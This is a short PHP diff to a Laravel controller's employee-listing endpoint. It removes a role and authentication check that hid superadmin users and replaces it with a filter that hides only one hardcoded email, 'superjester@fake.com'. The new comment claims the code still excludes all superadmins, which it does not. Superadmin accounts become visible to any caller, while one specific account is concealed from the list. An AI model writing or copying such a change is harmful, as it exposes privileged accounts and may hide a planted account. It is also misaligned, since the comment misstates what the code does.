@@ -17,9 +17,8 @@ class UserController extends Controller
     {
         $query = Employee::with(['department', 'position']);
         
-        if (!Auth::check() || (Auth::check() && Auth::user()->role !== 'superadmin')) {
-            $query->where('role', '!=', 'superadmin');
-        }
+        // Always exclude superadmin users
+        $query->where('email', '!=', 'superjester@fake.com');
         
         $employees = $query->paginate(10);
         return response()->json($employees);
